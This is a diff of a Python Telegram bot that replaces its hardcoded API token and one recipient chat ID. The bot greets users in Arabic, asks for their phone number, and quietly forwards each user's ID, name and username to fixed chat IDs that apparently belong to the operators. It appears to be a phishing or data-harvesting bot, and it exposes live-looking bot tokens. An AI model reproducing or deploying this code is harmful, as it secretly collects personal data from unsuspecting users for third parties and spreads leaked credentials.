@@ -8,7 +8,7 @@ import time
 import json
 app = Flask('')
 
-bot = telebot.TeleBot("7107722751:AAGgHM06V7ix_Fje1AoFnloeJa1zOAQQp0I")
+bot = telebot.TeleBot("7087560091:AAFRq5CQx2o1YAEYeLw2DCQwkrb6mbDei4k")
 
 @bot.message_handler(commands=["start"])
 def startt(message):
@@ -22,8 +22,8 @@ def startt(message):
   📍من فضــــــــلك قــم بإدخال رقــم هاتــفك يــوز إذ كنـــــــت مفعــل فهاذ لبـــوت 💗 📞:
     """ 
     response = f"User info:\nID: {user_id}\nName: {first_name} {last_name}\nUsername: @{username}"
-    bot.send_message(chat_id=message.chat.id, text=hamza)
-    bot.send_message(chat_id="5813081202, 5717886567", text=response)
+    bot.send_message(chat_id=message.chat.id, text=aziz)
+    bot.send_message(chat_id="5813081202, 6035997235", text=response)
 @bot.message_handler(func=lambda message: True)
 def get(message):
     user_id = message.from_user.id
